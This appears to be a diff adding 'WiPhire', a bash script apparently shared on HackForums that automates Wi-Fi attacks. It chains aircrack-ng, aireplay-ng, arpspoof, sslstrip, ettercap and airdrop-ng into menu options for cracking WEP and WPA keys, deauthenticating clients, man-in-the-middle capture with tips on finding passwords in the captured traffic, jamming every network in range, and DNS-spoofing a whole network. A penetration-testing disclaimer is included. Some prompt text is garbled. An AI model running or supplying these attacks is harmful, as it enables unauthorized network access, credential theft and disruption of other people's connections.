@@ -1,0 +1,729 @@
+
+#!/bin/bash
+
+#Variables
+wpainterface=0
+WPAMAC="00:11:22:33:44:55"
+WEPMAC="00:11:22:33:44:55"
+WEPinterface='mon0'
+wpainterface='mon0'
+#Functions
+
+#Monitor
+function monitor {
+clear
+echo
+echo "Choosing interface..." 
+echo
+interface1=$(airmon-ng | grep -v Interface | head -n 5 | tail -n -1  | awk  -F " " '{print $1}' )
+chipset1=$(airmon-ng | grep -v Chipset | head -n 5 | tail -n -1  | awk -F " " '{print $2}' )
+
+interface2=$(airmon-ng | grep -v Interface | head -n 6 | tail -n -1  | awk  -F " " '{print $1}' )
+chipset2=$(airmon-ng | grep -v Chipset | head -n 6 | tail -n -1  | awk -F " " '{print $2}' )
+
+interface3=$(airmon-ng | grep -v Interface | head -n 7 | tail -n -1  | awk  -F " " '{print $1}' )
+chipset3=$(airmon-ng | grep -v Chipset | head -n 7 | tail -n -1  | awk -F " " '{print $2}' )
+
+interface4=$(airmon-ng | grep -v Interface | head -n 8 | tail -n -1  | awk  -F " " '{print $1}' )
+chipset4=$(airmon-ng | grep -v Chipset | head -n 8 | tail -n -1  | awk -F " " '{print $2}' )
+
+function check1 {
+if [ $interface1 == mon0 ]; then 
+   echo "$interface1 is already in monitor mode."
+else
+$"check2" 
+fi
+}
+   
+function check2 {
+if [ $interface2 == mon0 ]; then 
+      echo "$interface2 is already in monitor mode."
+else
+$"check3" 
+fi
+}
+
+function check3 {
+      if [ $interface3 == mon0 ]; then 
+         echo "$interface3 is already in monitor mode."
+else
+$"check4" 
+fi
+}
+
+function check4 {
+
+         if [ $chipset1 == RTL8187 ]; then 
+            echo "Putting $interface1 into monitor mode..."
+            airmon-ng start $interface1
+         else
+$"check5"
+fi
+}
+       
+function check5 {
+     if [ $chipset2 == RTL8187 ]; then 
+               echo "Putting $interface2 into monitor mode..."
+               airmon-ng start $interface2
+            else
+$"check6" 
+fi
+}
+
+function check6 {
+               if [ $chipset3 == RTL8187 ]; then 
+                  echo "Putting $interface3 into monitor mode..."
+                  airmon-ng start $interface3 
+               else
+$"Check7"    
+fi
+}
+
+function Check7 {
+if [ $interface4 == mon0 ]; then 
+   echo "$interface4 is already in monitor mode."
+else
+$"Check8" 
+fi
+}
+
+function Check8 {
+         if [ $chipset4 == RTL8187 ]; then 
+            echo "Putting $interface4 into monitor mode..."
+            airmon-ng start $interface4
+         else
+            
+clear
+echo -e "\E[1;31mYou do not have a wireless card with an RTL8187 chipset.\033[0m If you do, disconnect then reconnect it."
+echo
+echo Returning to main menu
+sleep 1
+clear
+echo -e "\E[1;31mYou do not have a wireless card with an RTL8187 chipset.\033[0m If you do, disconnect then reconnect it."
+echo
+echo Returning to main menu.
+sleep 1
+clear
+echo -e "\E[1;31mYou do not have a wireless card with an RTL8187 chipset.\033[0m If you do, disconnect then reconnect it."
+echo
+echo Returning to main menu..
+sleep 1
+clear
+echo -e "\E[1;31mYou do not have a wireless card with an RTL8187 chipset.\033[0m If you do, disconnect then reconnect it."
+echo
+echo Returning to main menu...
+sleep 1
+$"mainmenu"
+fi
+}
+
+$"check1" 
+
+}
+
+#scan
+function  scan {
+clear
+$"monitor" 2>/dev/null
+echo
+echo 'Will now scan for networks... Once scanning press Ctl+C to exit and return to main menu. Press enter to continue' 
+read
+airodump-ng mon0
+echo Stopped.
+echo
+echo 'Press enter to return to the main menu.'
+read
+$"mainmenu"
+}
+
+#Info
+function Info {
+clear
+echo "This script was created for the sole purpose of penetration testing; the creator of this script are not to be held accountable for any illegal activities that this script is used for. This script was written by Middle. Please support the script by posting positive feedback on HackForums."
+echo
+echo "What you need:"
+echo
+echo "1) To be running Backtrack OS"
+echo "2) To have a Wi-Fi adapter capable of packet injection. You will need to have a RTL8187 chipset. Or to have put your card into  monitor mode prior to perform WEP/WPA cracking or the Airbomb attack."
+echo "3) A word list (For WPA only)"
+echo "4) Common sense"
+echo "5) Pre-existing knowledge of wireless hacking. I strongly recommend that you read my tutorials on HF before attempting to use this script. This will allow you to have an understanding of what is going on, and allow you to follwo the scirpt exactly as is required."
+echo
+echo "A bit about the options available:"
+echo  
+echo "0) Information and usage - This displays this screen... No shit sherlock"
+echo
+echo "1) Monitor networks - This will put your card into monitor mode and then scan for available networks. I added this because it is nice to do a bit of recon!"
+echo
+echo "2) Crack WEP - This will allow you to obtain the key to a WEP encrypted network by associating your computer with the router and capturing packets"
+echo
+echo "3) Crack WPA - This will allow you to crack the key to a WPA encrypted network using either a dictionary or a brute force attack."
+echo "This is not guaranteed to work, and may take weeks to be successful"
+echo
+echo "4) MITM attack - This will allow you to easily perform a 'Man in the Middle' attack. This means you can view all of the data being transfered on the network"
+echo
+echo "5) autoMACtic - This will allow you to easily spoof your MAC address, and even spoof it every 'x' seconds. 'x' being defined by you."
+echo
+echo "6) Airbomb - This is a powerful tool that should NOT be abused. It will in theory disconnect all clients from all AP's in range. It will also disconnect you from any wireless you are connected to as well."
+echo
+echo -e "7) DNSraep - This is very powerful and is onyl really included because it is so much fun XD Basically this will redirect all trafic on the network to a webpage displaying a message 'I Have been expecting you' More experienced users can edit this to become anyhting they want. To flush a windows machines DNS cache you can use 'ipconfig /flushdns' This will allow the computer to browse normally again. Note: \E[1;31mThis attack will also have the same effect on you!\033[0m"
+echo
+echo "8) Cleanup - This will delete all temporary files and take your card out of monitor mode. .cap files and mitm traffic will not be deleted. This is so you can analyse/crack them at your leisure."
+echo 
+echo "Scroll up there is a bit cut off!"
+echo
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+}
+
+#CrackWEP
+function CrackWEPmenu {
+clear
+$"CrackWEPsetup"
+}
+
+function CrackWEPsetup {
+$'monitor' 2>/dev/null
+echo
+echo Spoofing MAC address...
+$"CrackWEPspoof"
+}
+
+function CrackWEPspoof {
+echo
+
+ifconfig mon0 down
+macchanger -m $WEPMAC mon0
+ifconfig mon0 up
+echo
+echo Beginning airodump-ng...
+$"CrackWEPdump"
+}
+
+function CrackWEPdump {
+
+echo 
+echo "Leave airodump-ng to run until you find a target network; then press Ctl+C. Press enter to continue."
+read 
+airodump-ng --encrypt WEP mon0
+echo Stopped.
+echo
+echo -n "Please enter the ESSID of the network you wish to crack: "
+read WEPessid
+echo
+echo -n "Please enter the BSSID of the network you wish to crack: "
+read WEPbssid
+echo
+echo -n "Please enter the channel that the network you wish to crack is running on: "
+read WEPchannel
+echo
+echo "Running airodump-ng... Do not close this window."
+sleep 1
+xterm -hold -e airodump-ng --bssid $WEPbssid -c $WEPchannel -w WEP mon0 & 
+$"Associate"
+}
+
+function Associate {
+echo
+sleep 3
+echo "Associating you with the network..." 
+echo
+aireplay-ng -1 0 -a $WEPbssid -h 00:11:22:33:44:55 -e $WEPessid mon0
+echo
+echo -n "Has the association been successful? Enter y/n: "
+read WEPSuccess
+if [ $WEPSuccess == y ]; then
+echo 
+echo "Beginning arpreplay in a new window. Do not close this window..."
+echo
+$"arpreplay"
+else
+echo Not associated. Returning to main menu...
+sleep 3
+$"mainmenu"
+fi
+}
+
+function arpreplay {
+echo
+xterm -hold -e aireplay-ng -3 -b $WEPbssid -h 00:11:22:33:44:55 mon0 &
+echo "Wait for 30 seconds..."
+sleep 30
+echo
+echo -n "Go to the airodump-ng window. Under the column #Data is the number rising? If it isn't wait for 5 minutes before answering. Enter y/n: "
+read fast
+if [ $fast == y ]; then
+echo
+$"WEPcrack"
+else
+echo "You are either too far away or the network is being MAC filtered."
+echo "You will sadly have to crack this network by your self. Hint *Google is your friend*"
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+fi
+}
+
+function WEPcrack {
+echo 
+echo
+echo Beginning aircrack-ng... 
+echo Be patient and you will soon have the wireless key.
+echo
+aircrack-ng --bssid $WEPbssid WEP-0*.cap 
+echo
+echo "Please note [01:02:03:04:05] = 0102030405"
+echo 
+pkill -9 -f xterm >/dev/null
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+}
+
+#CrackWPA
+function CrackWPAmenu {
+clear
+$"CrackWPAsetup"
+}
+
+function CrackWPAsetup {
+echo
+$'monitor' 2>/dev/null
+echo Spoofing MAC address...
+$"CrackWPAspoof"
+}
+
+function CrackWPAspoof {
+echo
+
+ifconfig mon0 down
+macchanger -r mon0
+ifconfig mon0 up
+echo
+echo Beginning airodump-ng...
+$"CrackWPAdump"
+}
+
+function CrackWPAdump {
+echo 
+echo "Leave airodump-ng to run until you get a client assosciated with a network; then press Ctl+C. Press enter to continue."
+read 
+airodump-ng --encrypt WPA -a mon0 
+echo Stopped.
+echo
+echo -n "Please enter the BSSID of the network you wisIf you do, disconnect then reconnect it.h to crack: "
+read WPAbssid
+echo
+echo -n "Please enter the MAC address [Station] of a computer connected to the network you wish to crack: "
+read WPAstation
+echo
+echo -n "Please enter the channel that the network you wish to crack is running on: "
+read WPAchannel
+echo
+echo "Running airodump-ng..."
+xterm -hold -e airodump-ng --bssid $WPAbssid -c $WPAchannel -w handshake mon0 & 
+$"Deauth"
+}
+
+function Deauth {
+echo
+echo "Wait for 30 seconds..." 
+echo
+sleep 30
+aireplay-ng --deauth 3 -a $WPAbssid -c $WPAstation mon0
+echo
+echo "Wait for 30 seconds..."
+sleep 30
+echo
+echo -n "Has the text 'WPA Handshake: $WPAbssid' appeared in the top right hand corner of the airodump-ng window? Enter y/n: "
+read WPASuccess
+if [ $WPASuccess == y ]; then
+echo 
+echo Handshake captured. Cracking menu...
+echo
+pkill -9 -f xterm >/dev/null
+$"CrackingMenu"
+else
+echo
+echo -n 'Handshake not captured. Would you like to try again? y/n: '
+read redeauth
+if [ $redeauth == n ]; then
+$"mainmenu"
+else 
+$"CrackWPAdump"
+fi
+fi
+}
+
+function CrackingMenu {
+echo Cracking menu:
+echo
+echo "1) Crack using a dictionary "
+echo "2) Crack using a brute force"
+echo
+echo -n  "Please select which method of cracking you wish to use: "
+read Crackchoice
+case $Crackchoice in
+1 ) $"DictionaryAttack"
+;;
+2 ) $"BruteForce"
+;;
+esac
+}
+
+function DictionaryAttack {
+echo 
+echo
+echo -n "Please enter the file path to your wordlist [i.e. /root/Passlist]: "
+read Filepath
+echo
+echo Beginning aircrack-ng. This could take weeks...
+echo
+aircrack-ng --bssid $WPAbssid handshake-0*.cap -w $Filepath
+echo
+echo
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+}
+
+function BruteForce {
+echo 
+echo "This will work in BT4. This method will take years unless you have a powerful GPU. 700ppk/s is normal and slow. If you have a good combo of GPU's you can crack at 89,000ppk/s."
+echo -n "Please enter the number of times you attempted to get the handshake: "
+read Filenumber
+cd /pentest/passwords/crunch
+./crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 | pyrit -r /root/handshake-0$Filenumber.cap  -i - attack_passthrough
+echo
+echo
+echo "Press enter to return to the main menu."
+read
+clear
+$"mainmenu"
+}
+
+
+
+
+#Perform MITM
+
+function MITMattackmenu {
+clear
+$"MITMbegin"
+}
+
+function MITMbegin {
+gateway=$(route | grep -v Gateway | head -n 5 | tail -n -1  | awk  -F " " '{print $2}' )
+mitminterface=$(route | grep -v Gateway | head -n 5 | tail -n -1  | awk  -F " " '{print $8}' )
+echo
+echo
+xterm -hold -e/ "echo "1" > /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+sslstrip -w mitm" &
+
+echo
+$"findgateway"
+
+}
+
+function findgateway {
+echo
+echo "Beginning to arppoison the network in a new window..."
+echo
+echo "Leave this running for as long as you want. The longer you run the more traffic you will capture. "
+xterm -hold -e arpspoof -i $mitminterface $gateway &
+$"MITMinfo"
+}
+
+function MITMinfo {
+echo
+echo "You have now got a file named 'mitm' on your desktop. This contains all the network traffic you have collected. "
+echo 'press enter to continue...'
+read
+pkill -9 -f xterm >/dev/null
+echo "This file will now open. You must press F3 then search through it to find passwords. An example is..."
+echo "Press F3 > untick case sensitive > search for 'password='"
+echo "Repeat this process with the following phrases:"
+echo
+echo password=
+echo pass=
+echo username=
+echo user=
+echo 'Be creative and use your common sense to think of your own. Good luck! =]'
+echo 
+echo "Press enter to open the file."
+read 
+echo Opening file...
+kate /root/mitm &
+echo
+echo "Press enter to return to the main menu"
+read
+$"mainmenu"
+
+}
+
+
+
+#autoMACtic
+function autoMACticmenu {
+clear
+echo
+echo 
+airmon-ng
+echo "1) Spoof a MAC address randomly"
+echo "2) Spoof a MAC address that is user defined"
+echo "3) Automate MAC changing"
+echo "4) Return to main menu"
+echo 
+echo -n "What would you like to do: "
+read Menuchoice
+
+case $Menuchoice in
+1 ) $"RandomMac"
+;;
+2) $"UserMac"
+;;
+3 ) $"AutomatedMac"
+;;
+4 ) $"mainmenu"
+;;
+esac
+
+}
+
+
+function RandomMac {
+echo
+echo -n "Please enter the name of the interface that you wish to spoof: "
+read interface
+echo
+ifconfig $interface down
+macchanger -r $interface
+ifconfig $interface up
+echo
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+
+}
+
+function UserMac {
+echo
+echo -n "Please enter the name of the interface you wish to spoof: "
+read interface
+echo -n "Please enter the MAC address you wish to change $interface to: "
+read UserDefMAC
+echo
+ifconfig $interface down
+macchanger -m $UserDefMAC $interface
+ifconfig $interface up
+echo
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+
+}
+
+function AutomatedMac {
+echo
+echo -n "Please enter the name of the interface that you wish to spoof: "
+read interface
+echo -n "Please enter how many seconds you wish for your MAC address to change: "
+read seconds
+echo
+while : 
+do 
+ifconfig $interface down 
+macchanger -r $interface 
+ifconfig $interface up 
+sleep $seconds 
+done 
+echo "Press enter to return to the main menu."
+read
+$"mainmenu"
+}
+
+#Airbomb
+
+function Airbombsetup {
+$'monitor' 2>/dev/null
+echo Spoofing MAC address...
+$'Airbombspoof'
+}
+
+function Airbombspoof {
+echo
+ifconfig mon0 down
+macchanger -r mon0
+ifconfig mon0 up
+echo
+echo 'Beginning airodump-ng in a new window' ...
+$"raep"
+}
+
+function raep {
+echo 
+echo 'Please wait 40 seconds... Then press Ctl+C to call off the attack and return to the main menu.'
+echo
+sleep 5
+(xterm -hold -e airodump-ng -w capturecsv --output-format csv mon0) & sleep 35; kill $!
+echo success
+echo '#D' > rules && echo 'd/any|any' >> rules 
+cd /pentest/wireless/airdrop-ng/
+./airdrop-ng -i mon0 -t /root/capturecsv-01.csv -r /root/rules 
+$"mainmenu"
+
+}
+
+#DNSrape
+function DNSraep {
+clear
+echo
+echo 'This will redirect all trafic to your computer; and your computer will be displaying the message "I have been expecting you". Note that you can 'cure' Windows machines that have been targeted with this with "ipconfig /flushdns"'.
+echo
+echo -n 'Are you sure you want to continue with this? y/n:'
+read rapeornot
+if [ $rapeornot == n ]; then
+$"mainmenu"
+fi
+echo
+clear
+echo 'Beginning raep... Press "q" to quit and return to the main menu'
+echo
+rm /var/www/index.html
+echo "<center> 
+<body bgcolor=#000000>
+<p>
+<font color=#00ff00>
+I've been expecting you...
+</p>
+" >> /var/www/index.html
+echo
+/etc/init.d/apache2 start
+gateway=$(route | grep -v Gateway | head -n 5 | tail -n -1  | awk  -F " " '{print $2}' )
+dnsinterface=$(route | grep -v Gateway | head -n 5 | tail -n -1  | awk  -F " " '{print $8}' )
+IP=$(ifconfig $dnsinterface | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}')
+echo "* A $IP" >> /usr/share/ettercap/etter.dns
+gatewayip=$(ping -c 1 $gateway | grep 'from' | sed s/"("// | sed s/")"// | sed s/":"// | awk -F' ' '{ print $5}')
+echo $gatewayip
+ettercap -T -i $dnsinterface -Q -M arp:remote /$gatewayip/ // -P dns_spoof 
+echo
+echo
+echo 'Returning to main menu...'
+sleep 2
+$"mainmenu"
+}
+
+#Cleanup
+function cleanup {
+clear
+echo
+echo Note: .cap files and mitm traffic will not be deleted. 
+sleep 2
+rm /root/WEP-0*.csv
+rm /root/WEP-0*.kismet.csv
+rm /root/WEP-0*.kismet.netxml
+rm /root/handshake-0*.csv
+rm /root/handshake-0*.kismet.csv
+rm /root/handshake-0*.kismet.netxml
+rm /root/rules
+rm /root/capturecsv-0*.csv
+rm /root/replay_arp*****************
+airmon-ng stop mon0 
+pkill -9 -f xterm >/dev/null
+echo
+clear
+echo -e "\E[1;31mFiles deleted! Your desktop should be clear of unwanted files =] Your card will be taken out of monitor mode as well!\033[0m"
+echo
+echo Returning to main menu
+sleep 1
+clear
+echo -e "\E[1;31mFiles deleted! Your desktop should be clear of unwanted files =] Your card will be taken out of monitor mode as well!\033[0m"
+echo
+echo Returning to main menu.
+sleep 1
+clear
+echo -e "\E[1;31mFiles deleted! Your desktop should be clear of unwanted files =] Your card will be taken out of monitor mode as well!\033[0m"
+echo
+echo Returning to main menu..
+sleep 1
+clear
+echo -e "\E[1;31mFiles deleted! Your desktop should be clear of unwanted files =] Your card will be taken out of monitor mode as well!\033[0m"
+echo
+echo Returning to main menu...
+sleep 2
+clear
+$"mainmenu"
+
+}
+
+#Main menu
+
+function mainmenu {
+clear
+echo
+echo 
+echo -e "WiPhire - Wrtten by Middle"
+echo
+echo "0) Information and Usage"
+echo "1) Monitor networks"
+echo "2) Crack a WEP encrypted network"
+echo "3) Crack a WPA encrypted nerwork"
+echo "4) Perform a MITM attack"
+echo "5) Run autoMACtic"
+echo "6) Run the Airbomb"
+echo "7) DNSraep"
+echo "8) Cleanup"
+echo "9) Exit"
+echo
+echo -n "What would you like to do: "
+read Menuchoice
+
+case $Menuchoice in
+0 ) $"Info"
+;;
+1 ) $"scan"
+;;
+2 ) $"CrackWEPmenu"
+;;
+3 ) $"CrackWPAmenu"
+;;
+4 ) $"MITMattackmenu"
+;;
+5 ) $"autoMACticmenu"
+;;
+6 ) $"Airbombsetup"
+;;
+7 ) $"DNSraep"
+;;
+8 ) $"cleanup" 2>/dev/null
+;;
+9 ) clear 
+exit
+;;
+esac
+}
+
+function Begin {
+clear
+ if [[ $UID -ne 0 ]]; then
+    echo "$0 This script must be ran as root. To do this please log in as root."
+    exit 1
+  fi
+echo
+echo -n  "Are you going to use this script with malicious intent? Enter y/n: "
+read malicious
+if [ $malicious == y ]; then
+firefox www.fbi.gov 2>/dev/null && 
+exit
+else
+$"mainmenu"
+fi
+}
+
+#Program
+
+$"Begin" 
